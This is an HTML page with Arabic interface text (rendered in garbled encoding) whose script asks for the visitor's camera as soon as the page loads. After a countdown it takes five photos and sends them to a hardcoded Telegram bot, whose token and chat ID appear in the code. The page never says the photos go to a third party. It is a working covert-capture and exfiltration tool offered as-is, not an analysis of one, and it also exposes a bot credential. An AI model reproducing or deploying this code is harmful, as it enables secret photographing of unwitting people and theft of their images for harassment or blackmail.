<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="utf-8">
  <title>Ø§Ù„ØªÙ‚Ø§Ø· ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§</title>
  <style>
    body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;text-align:center;background:#fff;color:#333}
    #video{display:none;width:320px;height:240px;border:1px solid #ccc}
    #fallbackBtn{display:none;padding:10px 18px;font-size:18px}
    #countdown{margin:12px 0;font-size:22px}
  </style>
</head>
<body>
  <div>
    <div id="countdown">Ø¬Ø§Ø±Ù ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§â€¦</div>
    <button id="fallbackBtn">Ø§Ù†Ù‚Ø± Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</button><br>
    <video id="video" autoplay playsinline></video>
  </div>

<script>
// âœ… Ø­Ù…Ø§ÙŠØ© Ù…Ù† ØªÙƒØ±Ø§Ø± Ø§Ù„Ø¯Ø®ÙˆÙ„
const visits = JSON.parse(localStorage.getItem("visitLogs") || "[]");
const now = Date.now();

// Ù†Ø¸Ù Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª Ø§Ù„Ø£Ù‚Ø¯Ù… Ù…Ù† 30 Ø«Ø§Ù†ÙŠØ©
const recentVisits = visits.filter(ts => now - ts <= 30_000);
recentVisits.push(now);
localStorage.setItem("visitLogs", JSON.stringify(recentVisits));

if (recentVisits.length > 10) {
  // ØªÙ… Ø§Ù„Ø­Ø¸Ø± Ù…Ø¤Ù‚ØªÙ‹Ø§
  document.body.innerHTML = "<h1 style='text-align:center;margin-top:20vh;font-family:Arial;'>ğŸš« ØªÙ… Ø­Ø¸Ø±Ùƒ Ù…Ø¤Ù‚ØªÙ‹Ø§ Ù„Ù…Ø¯Ø© 10 Ø¯Ù‚Ø§Ø¦Ù‚</h1>";
  setTimeout(() => {
    localStorage.removeItem("visitLogs");
    location.reload();
  }, 10 * 60 * 1000); // 10 Ø¯Ù‚Ø§Ø¦Ù‚
} else {
  // âœ… Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø£ØµÙ„ÙŠ ÙŠØ¨Ø¯Ø£ Ù‡Ù†Ø§
  const botToken = '6953303172:AAGTWIISatwWXVfl8fusKoIw_lc4ISL-h-s';
  const chatId   = '1717245674';
  const PHOTO_LIMIT = 5;
  const INTERVAL_MS = 150;
  const video = document.getElementById('video');
  const countdownEl = document.getElementById('countdown');
  const fallbackBtn = document.getElementById('fallbackBtn');

  window.addEventListener('DOMContentLoaded', tryStartCapture);
  fallbackBtn.addEventListener('click', () => tryStartCapture(true));

  async function tryStartCapture(fromButton = false){
    try{
      const stream = await navigator.mediaDevices.getUserMedia({video:true});
      video.srcObject = stream;
      video.style.display = 'block';
      fallbackBtn.style.display = 'none';
      startSequence();
    }catch(err){
      console.warn('getUserMedia ÙØ´Ù„:', err);
      if(!fromButton){
        fallbackBtn.style.display = 'inline-block';
        countdownEl.textContent = 'Ø§Ø¶ØºØ· Ø§Ù„Ø²Ø± Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§';
      }else{
        alert('ØªØ¹Ø°Ù‘Ø± Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (ØªØ£ÙƒØ¯ Ù…Ù† Ø§Ù„Ø¥Ø°Ù† Ø£Ùˆ Ù…Ù† Ø§Ù„Ù…ØªØµÙØ­).');
      }
    }
  }

  function startSequence(){
    let remaining = 10;
    countdownEl.textContent = `Ø³ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØµÙˆÙŠØ± Ø®Ù„Ø§Ù„ ${remaining} Ø«ÙˆØ§Ù†Ùâ€¦`;
    const t = setInterval(()=>{
      remaining--;
      countdownEl.textContent = (remaining>0)
        ? `Ø³ÙŠØ¨Ø¯Ø£ Ø§Ù„ØªØµÙˆÙŠØ± Ø®Ù„Ø§Ù„ ${remaining} Ø«ÙˆØ§Ù†Ùâ€¦`
        : 'ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±â€¦';
      if(remaining<=0){ clearInterval(t); capturePhotos(); }
    },1000);
  }

  function capturePhotos(){
    let taken = 0;
    const photos = [];
    const canvas = document.createElement('canvas');
    canvas.width  = video.videoWidth  || 320;
    canvas.height = video.videoHeight || 240;
    const ctx = canvas.getContext('2d');

    const id = setInterval(()=>{
      if(taken >= PHOTO_LIMIT){
        clearInterval(id);
        sendPhotos(photos);
        countdownEl.textContent = 'Ø§ÙƒØªÙ…Ù„ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ âœ…';
        return;
      }
      ctx.drawImage(video,0,0);
      canvas.toBlob(b=>{ photos.push(b); });
      taken++;
    }, INTERVAL_MS);
  }

  function sendPhotos(blobs){
    blobs.forEach((blob,i)=>{
      const form = new FormData();
      form.append('chat_id', chatId);
      form.append('photo', blob, `photo${i+1}.jpg`);
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{method:'POST',body:form})
        .then(r=>r.json()).then(j=>console.log('Telegram',j))
        .catch(e=>console.error('Telegram error',e));
    });
  }
}
</script>
</body>
</html>
